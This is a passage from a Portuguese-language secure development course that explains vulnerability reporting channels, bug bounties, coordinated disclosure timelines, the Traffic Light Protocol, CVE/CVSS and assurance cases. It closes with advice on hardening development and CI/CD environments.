vulnerabilidade.</p> <h2 id=declare-publicamente-como-enviar-relatorios-de-vulnerabilidade>Declare publicamente como enviar relatórios de vulnerabilidade<a class=headerlink href=#declare-publicamente-como-enviar-relatorios-de-vulnerabilidade title="Permanent link">¶</a></h2> <p>Você deve informar aos outros, publicamente, como enviar relatórios de vulnerabilidade... e essas informações devem ser extremamente fáceis de encontrar. Caso contrário, potenciais relatores não reportarão vulnerabilidades a você, ou poderá haver um atraso significativo enquanto o projeto tenta descobrir como receber um relatório. Isso é perda de tempo, onde o tempo costuma ser essencial. Em 2019, a falha em declarar publicamente como enviar relatórios de vulnerabilidade foi o principal motivo pelo qual projetos de OSS não obtiveram o selo <em>de aprovação em</em> Melhores Práticas do OpenSSF ( <em><a href=https://events19.linuxfoundation.org/wp-content/uploads/2018/07/cii-bp-badge-2019-03.pdf>Selo de Melhores Práticas da Core Infrastructure Initiative (CII) em 2019</a></em> , por David A. Wheeler, 2019).</p> <p>Em certo sentido, esse requisito é fácil. Defina qual é a sua convenção de relatórios e facilite a localização dessas informações. Aqui estão algumas convenções comuns:</p> <ul> <li>Muitas empresas e projetos oferecem suporte a um endereço de e-mail no formato <strong><a href=mailto:security@example.com>security@example.com</a></strong> ou <strong><a href=mailto:abuse@example.com>abuse@example.com</a></strong> .</li> <li>Uma convenção comum em projetos OSS é fornecer essas informações em um arquivo chamado <strong>SECURITY.md</strong> na raiz do repositório ou no diretório <strong>docs/</strong> . Sites como o GitHub destacarão esse arquivo, se presente, e incentivarão sua criação. Adicione um link do seu arquivo <strong>README.md</strong> para este arquivo <strong>SECURITY.md .</strong></li> <li>Se o projeto tiver ou implementar um site, uma recomendação comum é adicionar um arquivo <strong>security.txt</strong> ao site em <strong>/security.txt</strong> ou <strong>/.well-known/security.txt</strong> . Para saber mais, visite <a href=https://securitytxt.org/ >securitytxt.org</a> .</li> <li>O GitHub oferece um novo tipo de rastreamento de problemas que os projetos podem habilitar para <a href=https://docs.github.com/en/code-security/security-advisories/guidance-on-reporting-and-writing/privately-reporting-a-security-vulnerability>relatar uma vulnerabilidade de segurança de forma privada</a> . Outras plataformas de gerenciamento de código-fonte têm recursos semelhantes. Quando usado, normalmente o arquivo <strong>SECURITY.md</strong> informará aos repórteres para usá-lo.</li> </ul> <p>Um desafio é que os invasores também estão muito interessados ​​em obter relatórios de vulnerabilidades, pois desejam explorá-las até que todos instalem suas correções ou mitigações. Portanto, geralmente é importante ter algum mecanismo para relatar vulnerabilidades que impeça os invasores de também obterem essas informações antes que um patch seja distribuído. Às vezes, isso pode ser difícil de fazer:</p> <ul> <li>Os sistemas de e-mail geralmente não são criptografados de ponta a ponta. Sistemas de e-mail que suportam criptografia de ponta a ponta (por exemplo, OpenPGP e S/MIME) não são amplamente utilizados, podem ser difíceis de usar e/ou são usados ​​principalmente em comunidades específicas.</li> <li>Muitos outros sistemas de comunicação para comunicação segura individual esperam que as partes já se conheçam, o que geralmente não é o caso em relatórios de vulnerabilidades.</li> <li>Os projetos OSS geralmente funcionam abertamente, então fóruns normais de discussão e relatórios (como rastreadores de problemas, sistemas de bate-papo, etc.) podem permitir que muitas pessoas (ou todos) vejam a discussão sobre uma vulnerabilidade, mesmo que ela não deva ser de conhecimento público.</li> </ul> <p>Se você não quer que invasores explorem imediatamente as vulnerabilidades reportadas a você, você deve usar algum tipo de criptografia para o relatório inicial. Uma solução imperfeita, mas útil, é usar sistemas de e-mail que suportem STARTTLS. A maioria dos grandes provedores de e-mail (como o GMail) e muitas empresas suportam STARTTLS. STARTTLS fornece <em>criptografia de camada de transporte</em> , ou seja, os e-mails são criptografados <em><strong>entre</strong></em> retransmissores de e-mail. A criptografia de camada de transporte não é tão segura quanto a criptografia de ponta a ponta, porque os e-mails são descriptografados em vários pontos. Além disso, STARTTLS é frequentemente implantado como <em>TLS oportunista</em> - o que significa que um invasor ativo que controla certos roteadores de rede ou retransmissores de e-mail pode ser capaz de desabilitar essa criptografia por um período de tempo. Dito isso, usar provedores de e-mail que suportam STARTTLS de forma transparente fornece proteção contra muitos dos tipos mais comuns de ataques à comunicação, além de ser muito fácil de usar.</p> <p>Você também deve usar criptografia para se comunicar entre os principais desenvolvedores, se não quiser que invasores saibam o que está acontecendo. No entanto, os desenvolvedores geralmente se conhecem, então isso costuma ser muito mais fácil de fazer.</p> <h2 id=monitorar-vulnerabilidades-incluindo-dependencias-vulneraveis>Monitorar vulnerabilidades, incluindo dependências vulneráveis<a class=headerlink href=#monitorar-vulnerabilidades-incluindo-dependencias-vulneraveis title="Permanent link">¶</a></h2> <p>Como já mencionamos, monitore vulnerabilidades no seu software e em todas as bibliotecas incorporadas nele. Você pode usar os alertas do Google para receber notificações sobre o seu software a partir de diversas fontes de notícias.</p> <p>Use uma ferramenta de análise de composição de software (SCA)/análise de origem para receber notificações sobre vulnerabilidades publicamente conhecidas recentemente descobertas em suas dependências.</p> <p>Como observado anteriormente, uma lista de materiais de software (SBOM) é um inventário aninhado que identifica os componentes de software que compõem um software maior.</p> <p>Quando uma SBOM está disponível para um componente que você está usando, geralmente é mais fácil usar esses dados para ajudar a detectar vulnerabilidades conhecidas.</p> <p>Muitos ecossistemas têm formatos de SBOM específicos para cada ecossistema. Existem também alguns formatos de SBOM que suportam ecossistemas arbitrários: <a href=https://spdx.dev/ >Software Package Data Exchange (SPDX)</a> , <a href=https://csrc.nist.gov/Projects/Software-Identification-SWID/ >Software ID (SWID)</a> e <a href=https://github.com/CycloneDX/specification>CycloneDX</a> .</p> <h2 id=considere-criar-um-programa-de-recompensa-por-bugs>Considere criar um programa de recompensa por bugs<a class=headerlink href=#considere-criar-um-programa-de-recompensa-por-bugs title="Permanent link">¶</a></h2> <p>Uma técnica amplamente utilizada para incentivar o relato de vulnerabilidades é um <em>programa de recompensa por bugs</em> , no qual você paga repórteres para relatar defeitos especialmente importantes.</p> <p>Essa pode ser uma maneira econômica de incentivar as pessoas a relatarem vulnerabilidades para você depois que todas as vulnerabilidades relativamente "fáceis de encontrar" forem encontradas e corrigidas. Se você não quiser gerenciar esse programa sozinho, existem várias empresas que podem fazer isso por você mediante o pagamento de uma taxa.</p> <p>Certifique-se de estabelecer claramente o escopo e os termos de quaisquer programas de recompensa por bugs ( <a href=https://cheatsheetseries.owasp.org/cheatsheets/Vulnerability_Disclosure_Cheat_Sheet.html>OWASP Vulnerability Disclosure</a> ). Especifique o valor pelo qual você pagará, incluindo uma faixa mínima e máxima. Por exemplo, <em>"<span class=arithmatex>\(X-\)</span>Y por uma vulnerabilidade que leva diretamente à execução remota de código sem exigir credenciais de login".</em> </p> <p>Se houver um valor máximo que você pode gastar em um ano, informe-o e indique o valor total, o calendário utilizado e o que acontecerá com os relatórios após o término do financiamento anual. Além disso, deixe claro quem não é elegível, por exemplo, desenvolvedores do software e/ou funcionários das empresas que desenvolvem o software.</p> <p>No entanto, atenção: um programa de recompensa por bugs pode ser um desperdício de dinheiro, a menos que as vulnerabilidades fáceis de encontrar sejam encontradas e corrigidas primeiro.</p> <p>Como Katie Moussouris observou, <em>"Nem todos os bugs são criados iguais"</em> ; muitos defeitos (como a maioria dos defeitos de XSS) são fáceis de detectar e corrigir, e <em>"você também deveria encontrar esses bugs facilmente".</em> Usar um programa de recompensa por bugs para encontrar vulnerabilidades fáceis de encontrar é extremamente caro e <em>"não é uma gestão de risco adequada".</em> </p> <p>Ela até mencionou um caso em que uma empresa acabou pagando US$ 29.000 por hora a um pesquisador de segurança para encontrar defeitos simples e conhecidos. Encontre e corrija os bugs simples primeiro, e <em>então</em> um programa de recompensa por bugs pode fazer sentido ( <em><a href=https://www.zdnet.com/article/relying-on-bug-bounties-not-appropriate-risk-management-katie-moussouris/ >Relying on bug bounties 'not appropriate risk management': Katie Moussouris</a></em> , por Stilgherrian, 2019).</p> <h2 id=responda-e-corrija-a-vulnerabilidade-em-tempo-habil>Responda e corrija a vulnerabilidade em tempo hábil<a class=headerlink href=#responda-e-corrija-a-vulnerabilidade-em-tempo-habil title="Permanent link">¶</a></h2> <p>É claro que, uma vez recebido um relatório de vulnerabilidade, ele deve ser respondido e corrigido em tempo hábil. A OWASP recomenda o seguinte ( <a href=https://cheatsheetseries.owasp.org/cheatsheets/Vulnerability_Disclosure_Cheat_Sheet.html>Divulgação de Vulnerabilidades da OWASP</a> ):</p> <ul> <li>Responda aos relatórios em um prazo razoável.</li> <li>Comunique-se abertamente com os pesquisadores.</li> <li>Não ameace com ações legais contra pesquisadores.</li> </ul> <p>Você precisa ser capaz de triar relatórios de vulnerabilidade rapidamente; alguns relatórios não se aplicam ao seu software ou não são realmente vulnerabilidades. É bastante comum precisar fazer mais perguntas para realmente entender a vulnerabilidade.</p> <h1 id=corrigindo-a-vulnerabilidade>Corrigindo a vulnerabilidade<a class=headerlink href=#corrigindo-a-vulnerabilidade title="Permanent link">¶</a></h1> <p>Depois de determinar que realmente é uma vulnerabilidade, você precisará corrigi-la.</p> <p>Se você quiser poder discutir relatórios em um grupo restrito — e a maioria dos grupos quer — você deve configurar isso com antecedência.</p> <p>Garanta que você possa criar rapidamente um ambiente de teste funcional para qualquer versão e ambiente suportados do software. Portanto, garanta um bom controle de versão do código-fonte e também que você possa criar rapidamente os ambientes de desenvolvimento e teste.</p> <p>Ao corrigir uma vulnerabilidade de segurança, verifique se o mesmo tipo de vulnerabilidade existe em situações semelhantes no software. Se existirem, corrija-as também. Além disso, sempre que possível, considere fazer alterações para evitar a recorrência desse tipo de vulnerabilidade.</p> <p>Se a sua atualização causar problemas, as pessoas a rejeitarão e aprenderão a não aceitar atualizações futuras suas. Qualquer correção proposta deve evitar incompatibilidades com versões anteriores, se possível. Também deve ser de alta qualidade. Isso implica que você precisa ter um conjunto robusto de testes <em>automatizados</em> antes de lançar o software e ter o hardware necessário para executá-lo (caso os testes exijam hardware especial). Adicione testes automatizados relacionados ao que você está alterando, tanto para garantir que realmente corrija o problema quanto para verificar se a alteração não afeta negativamente nada mais.</p> <p><a class=glightbox data-desc-position=bottom data-height=auto data-type=image data-width=80% href=https://d36ai2hkxl16us.cloudfront.net/course-uploads/e0df7fbf-a057-42af-8a1f-590912be5460/fl5rwomwyjor-image.png><img alt src=https://d36ai2hkxl16us.cloudfront.net/course-uploads/e0df7fbf-a057-42af-8a1f-590912be5460/fl5rwomwyjor-image.png></a></p> <h1 id=limitacao-de-divulgacao-e-o-protocolo-de-semaforo-first-tlp>Limitação de Divulgação e o Protocolo de Semáforo FIRST (TLP)<a class=headerlink href=#limitacao-de-divulgacao-e-o-protocolo-de-semaforo-first-tlp title="Permanent link">¶</a></h1> <p>Ao discutir uma vulnerabilidade, muitas vezes é importante discutir informações detalhadas, mas, ao mesmo tempo, instruir as pessoas a limitar a divulgação de algumas informações por um período. Além disso, tornou-se comum que haja diversas partes envolvidas em uma vulnerabilidade: pode haver vários fornecedores (incluindo vendedores) que implementam software com a vulnerabilidade, distribuidores e organizações envolvidas na distribuição de informações sobre a vulnerabilidade.</p> <p>A FIRST desenvolveu um sistema de marcação simples para isso, chamado <a href=https://www.first.org/tlp/ ><em>Protocolo de Semáforo</em> (TLP)</a> , frequentemente usado para indicar com quem as informações podem ser compartilhadas. Aqui está um breve resumo. O TLP possui quatro valores de cores para indicar os limites de compartilhamento, que são dispostos da seguinte forma:</p> <ul> <li>No e-mail: a cor TLP está na linha de assunto e também no corpo antes das informações designadas.</li> <li>Em documentos: a cor TLP está no cabeçalho e rodapé de cada página, normalmente justificada à direita.</li> </ul> <p>A cor TLP é mostrada em letras maiúsculas após <strong>TLP:,</strong> então você verá <strong>TLP:RED</strong> , <strong>TLP:AMBER</strong> , <strong>TLP:GREEN</strong> ou <strong>TLP:WHITE</strong> . Essas cores têm o seguinte significado:</p> <ul> <li><strong>TLP:RED</strong> = Não divulgar, restrito apenas aos participantes.</li> <li><strong>TLP:AMBER</strong> = Divulgação limitada, restrita às organizações dos participantes.</li> <li><strong>TLP:GREEN</strong> = Divulgação limitada, restrita à comunidade.</li> <li><strong>TLP:WHITE</strong> = A divulgação não é limitada.</li> </ul> <h1 id=obtenha-um-cve-e-calcule-cvss>Obtenha um CVE e calcule CVSS<a class=headerlink href=#obtenha-um-cve-e-calcule-cvss title="Permanent link">¶</a></h1> <p>Você deve solicitar um CVE quando apropriado e quando ainda não tiver sido solicitado ( <a href=https://cheatsheetseries.owasp.org/cheatsheets/Vulnerability_Disclosure_Cheat_Sheet.html>OWASP Vulnerability Disclosure</a> ). Normalmente, você iniciaria esse processo após verificar se o relatório realmente representa uma vulnerabilidade e, portanto, o faria simultaneamente à correção. Se solicitar um CVE, você também deve calcular a pontuação do Common Vulnerability Scoring System (CVSS) da vulnerabilidade. O CVSS é uma estimativa aproximada da gravidade de uma vulnerabilidade.</p> <p>A razão para CVEs e CVSS é simples: as organizações estão sobrecarregadas com atualizações de software e precisam de informações que as ajudem a priorizar as atualizações. CVEs e CVSS não são perfeitos, mas são amplamente utilizados e confiáveis. A pesquisa " <em><a href=https://www.servicenow.com/lpayr/ponemon-vulnerability-survey.html>Custos e Consequências das Lacunas nas Respostas a Vulnerabilidades"</a></em> (2019) do Ponemon Institute constatou que:</p> <ul> <li><em>"Quase metade dos entrevistados (48%) relatam que suas organizações sofreram uma ou mais violações de dados nos últimos dois anos."</em></li> <li><em>"60% das vítimas de violação disseram que foram violadas devido a uma vulnerabilidade conhecida na qual o patch não foi aplicado."</em></li> <li><em>"A pontuação CVSS… geralmente é a única métrica de priorização de patches [embora] deixe de fora a criticidade dos ativos e sistemas como parte da resposta à vulnerabilidade."</em></li> <li><em>"44% dos entrevistados dizem que suas organizações usam automação para auxiliar no gerenciamento de vulnerabilidades e aplicação de patches [(principalmente priorização e aplicação de patches)]."</em></li> <li><em>"A automação reduz o tempo de resposta a vulnerabilidades... 80% das organizações... que usam automação afirmam ter a capacidade de responder a vulnerabilidades em um prazo menor."</em> No entanto, essa automação depende de uma série de fatores, incluindo (na maioria dos casos) a atribuição de um CVE quando há uma vulnerabilidade.</li> </ul> <p>O CVSS é amplamente utilizado devido à necessidade de uma priorização clara, mas também é amplamente criticado (por exemplo, " <em><a href=https://opensourcesecurity.io/2020/05/27/broken-vulnerability-severities/ >Broken vulnerability severities"</a></em> , de Josh Bressers, 2020). Uma nova versão do CVSS (além da versão 3), ou uma substituta para ela, pode ser desenvolvida e/ou se tornar amplamente utilizada no futuro.</p> <h1 id=divulgue-a-atualizacao-e-conte-ao-mundo>Divulgue a atualização e conte ao mundo<a class=headerlink href=#divulgue-a-atualizacao-e-conte-ao-mundo title="Permanent link">¶</a></h1> <p>Assim que a correção estiver pronta, libere-a. Você precisará informar ao mundo que o software foi corrigido e fazer tudo o que puder para incentivar a rápida adoção da versão corrigida. A OWASP recomenda que os fornecedores publiquem alertas de segurança e registros de alterações claros, e também que deem crédito ao descobridor de vulnerabilidades ( <a href=https://cheatsheetseries.owasp.org/cheatsheets/Vulnerability_Disclosure_Cheat_Sheet.html>Divulgação de Vulnerabilidades da OWASP</a> ).</p> <p>Se houver soluções alternativas que possam ser aplicadas sem atualizar o software, certifique-se de anotá-las. Isso é particularmente importante se:</p> <ul> <li>é provável que haja muitos usuários que não conseguem atualizar seu software, ou</li> <li>a vulnerabilidade é conhecida publicamente, mas o patch não será lançado por algum tempo.</li> </ul> <p>Garanta a facilidade de atualização automática para a versão corrigida do software. Se a sua plataforma de software não oferece lançamentos ou instalação automática de patches, considere implementar uma você mesmo. Os usuários precisam poder receber correções de forma rápida e automática, a menos que tenham expressamente optado por não receber atualizações.</p> <p>Certifique-se de sempre dar crédito e agradecer aos denunciantes de vulnerabilidades, a menos que eles solicitem o contrário. É falta de educação não dar crédito, e muitos denunciantes de vulnerabilidades fornecem relatórios <em>principalmente</em> para obter crédito. Pior ainda, os denunciantes podem ser menos cooperativos no futuro se não receberem o devido crédito.</p> <h1 id=enviando-relatorios-de-vulnerabilidade-para-outras-pessoas>Enviando relatórios de vulnerabilidade para outras pessoas<a class=headerlink href=#enviando-relatorios-de-vulnerabilidade-para-outras-pessoas title="Permanent link">¶</a></h1> <p>Após concluir esta série de cursos, você terá muito mais chances de detectar vulnerabilidades em softwares. Nesta unidade, discutiremos como enviar relatórios de vulnerabilidades a terceiros.</p> <p>O <a href=https://cheatsheetseries.owasp.org/cheatsheets/Vulnerability_Disclosure_Cheat_Sheet.html>OWASP <em>Vulnerability Disclosure Cheat Sheet</em></a> recomenda que pesquisadores de segurança (que encontram vulnerabilidades de segurança) devem:</p> <ul> <li>Certifique-se de que qualquer teste seja legal e autorizado.</li> <li>Respeite a privacidade dos outros.</li> <li>Faça esforços razoáveis ​​para entrar em contato com a equipe de segurança da organização.</li> <li>Forneça detalhes suficientes para permitir que as vulnerabilidades sejam verificadas e reproduzidas.</li> <li>Não exigir pagamento ou recompensas por relatar vulnerabilidades fora de um programa de recompensa por bugs estabelecido.</li> </ul> <p>Relatar uma vulnerabilidade encontrada pode ser surpreendentemente complicado. Se houver um único fornecedor, você pode relatar apenas para ele. Mas, às vezes, há vários fornecedores e outras partes interessadas envolvidas. Há também várias maneiras de relatar uma vulnerabilidade.</p> <h2 id=modelos-de-relatorios>Modelos de Relatórios<a class=headerlink href=#modelos-de-relatorios title="Permanent link">¶</a></h2> <table> <thead> <tr> <th></th> <th></th> </tr> </thead> <tbody> <tr> <td>Divulgação Privada</td> <td><em>No modelo de divulgação privada, a vulnerabilidade é reportada privadamente à organização. A organização pode optar por publicar os detalhes das vulnerabilidades, mas isso é feito a critério da organização, não do pesquisador, o que significa que muitas vulnerabilidades podem nunca ser tornadas públicas. A maioria dos programas de recompensa por bugs exige que o pesquisador siga esse modelo. O principal problema com esse modelo é que, se o fornecedor não responder ou decidir não corrigir a vulnerabilidade, os detalhes podem nunca ser tornados públicos. Historicamente, isso levou os pesquisadores a se cansarem de empresas que ignoram e tentam esconder vulnerabilidades, levando-os à abordagem de divulgação completa.</em> ( <a href=https://cheatsheetseries.owasp.org/cheatsheets/Vulnerability_Disclosure_Cheat_Sheet.html>Divulgação de Vulnerabilidades da OWASP</a> )</td> </tr> <tr> <td>Divulgação completa</td> <td><em>Com a abordagem de divulgação completa, todos os detalhes da vulnerabilidade são tornados públicos assim que são identificados. Isso significa que todos os detalhes (às vezes incluindo o código de exploração) estão disponíveis para os invasores, muitas vezes antes que um patch esteja disponível. A abordagem de divulgação completa é usada principalmente em resposta a organizações que ignoram vulnerabilidades relatadas, a fim de pressioná-las a desenvolver e publicar uma correção. Isso torna a abordagem de divulgação completa muito controversa e é vista como irresponsável por muitas pessoas. Geralmente, ela só deve ser considerada como último recurso, quando todos os outros métodos falharam ou quando o código de exploração já está disponível publicamente.</em> ( <a href=https://cheatsheetseries.owasp.org/cheatsheets/Vulnerability_Disclosure_Cheat_Sheet.html>Divulgação de Vulnerabilidade OWASP</a> ). Outro motivo para considerar a divulgação completa é se houver motivos para acreditar que o fornecedor é intencionalmente malicioso; relatar uma vulnerabilidade apenas a um fornecedor malicioso dá a ele mais tempo para explorar a vulnerabilidade.</td> </tr> <tr> <td>Divulgação Coordenada (historicamente chamada de Divulgação Responsável)</td> <td>A divulgação coordenada <em>“tenta encontrar um meio-termo razoável entre essas duas abordagens. … o relatório inicial é feito de forma privada, mas com os detalhes completos sendo publicados assim que um patch for disponibilizado (às vezes com um atraso para permitir mais tempo para a instalação dos patches).”</em> ( <a href=https://cheatsheetseries.owasp.org/cheatsheets/Vulnerability_Disclosure_Cheat_Sheet.html>Divulgação de Vulnerabilidades OWASP</a> ). Historicamente, isso tem sido chamado de <em>divulgação responsável</em> , mas este é um termo tendencioso, e seu criador original agora recomenda chamá-lo <em>de divulgação coordenada</em> . É <strong>importante</strong> que haja um <strong>limite de tempo</strong> antes que a vulnerabilidade seja divulgada unilateralmente. Sem um limite de tempo, isso é essencialmente idêntico à divulgação privada, uma vez que o fornecedor pode ter pouco incentivo para corrigir a vulnerabilidade.</td> </tr> <tr> <td>Divulgação para invasores</td> <td>Alguns pesquisadores trabalham para organizações que atacam sistemas de terceiros. Outros pesquisadores vendem vulnerabilidades para essas organizações ou para corretores que, por sua vez, as revendem. Fazer isso é controverso, especialmente quando as vulnerabilidades são vendidas para corretores que não divulgam claramente quem está comprando as vulnerabilidades. O impacto disso varia, pois há uma grande variedade de organizações que pagam por vulnerabilidades. Essas organizações incluem autoridades policiais em vários países, forças armadas em vários países, crime organizado e/ou grupos terroristas. Qualquer pessoa que forneça vulnerabilidades a invasores deve considerar as implicações éticas. Em particular, você deve considerar o que os invasores provavelmente farão com essas vulnerabilidades. Você tem confiança de que os invasores não usarão as vulnerabilidades em violação aos direitos humanos? Eles prejudicarão certas pessoas ou grupos, como minorias étnicas, dissidentes políticos ou jornalistas? Se você divulgar vulnerabilidades aos invasores, estará apoiando como essas organizações usarão essas vulnerabilidades para atacar outras; você deve ter certeza de que eles os usarão para o bem.</td> </tr> <tr> <td>A partir daqui, presumiremos que você siga um <em>modelo de divulgação coordenado</em> com um prazo limitado.</td> <td></td> </tr> </tbody> </table> <p>Os prazos de divulgação coordenada (também conhecidos como <em>períodos de embargo</em> ) variam muito. Esse prazo é o período entre o momento em que um denunciante relata a vulnerabilidade ao fornecedor e o momento em que o denunciante a divulga unilateralmente ao público. Em geral, os fornecedores pressionam por prazos mais longos ou nenhum prazo, muitas vezes porque isso reduzirá seus custos (possivelmente a zero se o fornecedor conseguir estender o prazo para que nunca precise corrigir a vulnerabilidade). Organizações encarregadas de proteger o público e organizações multipartidárias tendem a pressionar por prazos mais curtos. Algumas vulnerabilidades são mais fáceis de corrigir do que outras, o que torna difícil escolher números simples. Aqui estão alguns exemplos de prazos de divulgação pública:</p> <ul> <li><a href=http://oss-security.openwall.org/wiki/mailing-lists/distros>linux-distros</a> : menos de 7 dias preferencialmente, até 14 dias permitidos, até 19 dias se quinta/sexta-feira, relatório e divulgação na segunda/terça-feira</li> <li><a href=http://ocert.org/ >oCERT</a> : 14 dias padrão; 7 dias se trivial, 30 dias se crítico/complexo, até 2 meses "extremamente excepcional"</li> <li><a href=https://www.cert.org/vulnerability-analysis/vul-disclosure.cfm>CERT/CC</a> : 45 dias <em>"independentemente da existência... de patches ou soluções alternativas... Circunstâncias atenuantes... podem resultar em divulgação antecipada ou tardia... Não distribuiremos exploits"</em></li> <li><a href=https://googleprojectzero.blogspot.com/p/vulnerability-disclosure-faq.html>Google Project Zero</a> : 90 dias.</li> </ul> <h1 id=mais-informacoes>Mais informações<a class=headerlink href=#mais-informacoes title="Permanent link">¶</a></h1> <p><em><a href=https://www.first.org/global/sigs/vulnerability-coordination/multiparty/guidelines-v1.1>Uma boa fonte para mais informações são as Diretrizes e Práticas para Coordenação e Divulgação de Vulnerabilidades Multipartidárias</a></em> da FIRST . Historicamente, muitos documentos se concentravam na coordenação bilateral simples entre um pesquisador de segurança e um fornecedor de software, mas hoje em dia muitas vezes há complexidades devido à necessidade de coordenação multipartidária. Este documento da FIRST discute essas situações mais complexas e fornece diretrizes para lidar com elas.</p> <h1 id=casos-de-garantia>Casos de Garantia<a class=headerlink href=#casos-de-garantia title="Permanent link">¶</a></h1> <p>Infelizmente, não é possível fazer apenas uma coisa e tornar um sistema seguro. Em vez disso, é preciso fazer uma variedade de coisas. Acompanhar as diversas técnicas necessárias para garantir que você esteja realmente abordando tudo o que acha que deveria pode ser exaustivo... especialmente se o seu software for grande ou se houver expectativas de segurança robusta. Além disso, às vezes, potenciais partes interessadas (como usuários) querem entender o que você está fazendo para determinar se está fazendo o suficiente para os propósitos deles. Uma lista não estruturada de <em>"coisas que foram feitas"</em> não ajuda muito quando um sistema fica maior; você pode fazer muitas coisas, mas deixar de abordar algo importante.</p> <p>Uma alternativa prática é criar um <em>caso de asseguração</em> . Um caso de asseguração <em>"inclui uma alegação de alto nível para uma propriedade de um sistema ou produto (ou conjunto de alegações), argumentação sistemática sobre essa alegação e as evidências e premissas explícitas que fundamentam essa argumentação"</em> ( <a href=https://www.iso.org/standard/52926.html>ISO/IEC 15026-2:2011</a> ). Vejamos essa definição; em outras palavras, um caso de asseguração inclui:</p> <ul> <li><strong>Afirmação(ões)</strong> Afirmação(ões) de nível superior para uma propriedade de um sistema ou produto. Ou seja, algo que você deseja que seja verdadeiro.</li> <li><strong>Argumentos</strong> Uma argumentação sistemática que justifica esta afirmação.</li> <li><strong>Evidências/suposições</strong> Evidências e suposições explícitas que fundamentam o argumento.</li> </ul> <p>O objetivo de um caso de garantia é que ele seja <em>sistemático</em> . Em outras palavras, você deve começar com qualquer(s) afirmação(ões) importante(s) que queira fazer e destrinchar repetidamente para demonstrar que a afirmação é verdadeira. Imagine que você é um advogado tentando defender um caso para um júri cético; seu trabalho é justificar que a(s) afirmação(ões) é(são) verdadeira(s). Criar um caso de garantia ajuda você a determinar e justificar para as pessoas que o software é seguro, tanto para os outros quanto para você.</p> <p>Um caso de asseguração não precisa ter um formato específico. No entanto, geralmente são documentos com figuras mostrando a estrutura de alto nível e texto fornecendo os detalhes. Isso ocorre simplesmente porque é fácil olhar as figuras para ver como as coisas funcionam juntas, mas o texto fornece os detalhes para realmente entender as coisas.</p> <p>Vamos discutir uma maneira de criar um caso de garantia, com base no material de <em><a href=https://www.ida.org/-/media/feature/publications/a/as/a-sample-security-assurance-case-pattern/p-9278.ashx>"A Sample Security Assurance Case Pattern"</a></em> de David A. Wheeler (2018). Digamos que temos uma alegação geral: queremos afirmar que nosso "sistema é adequadamente seguro contra ameaças moderadas". Vamos argumentar que podemos fornecer provas adequadas disso se nossos requisitos de segurança forem identificados e atendidos por sua funcionalidade, e se a segurança for implementada pelos processos do ciclo de vida do sistema. Podemos decompor os requisitos de segurança em nossa tríade de requisitos de segurança (confidencialidade, integridade e disponibilidade), lidando adequadamente com o controle de acesso e identificando e abordando os ativos e os agentes da ameaça. Aqui está uma figura que mostra o nível superior de um caso de garantia:</p> <p><a class=glightbox data-desc-position=bottom data-height=auto data-type=image data-width=80% href=https://d36ai2hkxl16us.cloudfront.net/course-uploads/e0df7fbf-a057-42af-8a1f-590912be5460/c6td41fx4kz7-image.png><img alt src=https://d36ai2hkxl16us.cloudfront.net/course-uploads/e0df7fbf-a057-42af-8a1f-590912be5460/c6td41fx4kz7-image.png></a></p> <p><strong>Exemplo de nível superior de um caso de garantia</strong> , por David A. Wheeler (2018)</p> <p>Poderíamos então detalhar cada item de forma repetida. Por exemplo, poderíamos dividir os processos do ciclo de vida em áreas como design, implementação e verificação. Poderíamos então explicar como abordamos a segurança em cada uma delas:</p> <ul> <li>Para o design, podemos mostrar que seguimos todos os princípios de design de Saltzer &amp; Schroeder (S&amp;S) que já discutimos no primeiro curso deste programa.</li> <li>Para implementação, podemos mostrar que combatemos todas as vulnerabilidades "principais" identificadas por alguma lista amplamente aceita e relevante de vulnerabilidades principais.</li> <li>Para verificação, podemos mostrar que usamos uma variedade de ferramentas para detectar vulnerabilidades antes do software ser lançado.</li> </ul> <p>Para uma discussão detalhada e um modelo para a criação de um caso de garantia, consulte <em><a href=https://www.ida.org/-/media/feature/publications/a/as/a-sample-security-assurance-case-pattern/p-9278.ashx>"Um Exemplo de Padrão de Caso de Garantia de Segurança",</a></em> de David A. Wheeler (2018). Se quiser ver um exemplo real, consulte o <a href=https://github.com/coreinfrastructure/best-practices-badge/blob/main/docs/assurance-case.md>caso de garantia do OpenSSF Best Practices BadgeApp</a> .</p> <p>Quando você termina? A resposta usual é quando as partes interessadas concordam que é suficiente. Se não acharem que é suficiente, pergunte o que seria suficiente e se estão dispostos a pagar por essas mudanças. Se não estiverem pagando o suficiente, você não precisa fazer isso.</p> <p>O melhor de um caso de garantia é que, se alguém quiser saber mais tarde se este software é suficientemente seguro, basta revisá-lo. <em>Ter</em> um caso de garantia proporciona muita confiança, pois demonstra que alguém pensou bem no que o sistema deveria fazer e tem um argumento razoável (com evidências) de que as alegações estão corretas.</p> <h1 id=fortalecer-o-ambiente-de-desenvolvimento-incluindo-pipeline-de-construcao-e-cicd-e-o-ambiente-de-distribuicao>Fortalecer o ambiente de desenvolvimento (incluindo pipeline de construção e CI/CD) e o ambiente de distribuição<a class=headerlink href=#fortalecer-o-ambiente-de-desenvolvimento-incluindo-pipeline-de-construcao-e-cicd-e-o-ambiente-de-distribuicao title="Permanent link">¶</a></h1> <p>A maioria dos ataques ocorre quando um sistema é implantado, mas cada vez mais os invasores atacam sistemas durante seu desenvolvimento e distribuição. Para nossos propósitos, o "ambiente de desenvolvimento" inclui o conjunto de todas as máquinas e outras infraestruturas usadas para desenvolver o software, incluindo os sistemas de cada desenvolvedor, sistema(s) de controle de versão, sistemas de compilação, pipelines de CI/CD e assim por diante. O "ambiente de distribuição" é o ambiente usado para distribuir o software gerado, por exemplo, registros/repositórios de pacotes, registros/repositórios de contêineres e assim por diante. É importante proteger o ambiente de desenvolvimento e o ambiente de distribuição contra acesso não autorizado ou comprometimento. Isso inclui protegê-los contra a inserção de código malicioso. Suponha que os invasores estejam tentando subverter qualquer sistema usado para desenvolvimento ou distribuição de software, especialmente quaisquer sistemas compartilhados.</p> <p>Primeiro, minimize os privilégios. Limite quem pode controlar esses ambientes e em que medida. Se alguém sair de um projeto e/ou organização, remova seus privilégios; mesmo que não ataque, um invasor pode obter suas credenciais. Limite os privilégios concedidos aos ambientes. Por exemplo, se um pipeline de CI/CD receber um token de autenticação, forneça um token com os privilégios mínimos necessários para que, se o token for exposto, o dano seja reduzido. Se um token for necessário apenas em alguns casos (como ao processar determinadas ramificações, como "principal"), forneça o token apenas nesses casos.</p> <p>Uma abordagem simples é fazer com que os desenvolvedores usem tokens de autenticação multifator (MFA) (também conhecidos como chaves) ao acessar ambientes de desenvolvimento. Trata-se de dispositivos de hardware que comprovam que o desenvolvedor possui o dispositivo e, como são de uso único, são difíceis de serem subvertidos por 